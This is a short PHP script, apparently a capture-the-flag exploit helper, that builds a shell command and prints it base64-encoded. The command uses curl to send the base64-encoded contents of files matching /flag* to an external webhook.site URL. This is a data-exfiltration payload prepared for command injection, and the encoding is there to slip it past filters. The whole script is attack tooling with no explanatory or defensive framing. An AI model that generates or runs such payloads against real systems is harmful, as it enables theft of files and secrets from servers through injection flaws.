<?php 
$conv = "curl https://webhook.site/afb7705b-6bc7-4dda-b437-2769400c44cb/$(base64 -w0 /flag*)";
$conv_b = base64_encode($conv);
echo $conv_b;
echo "\n";
?>
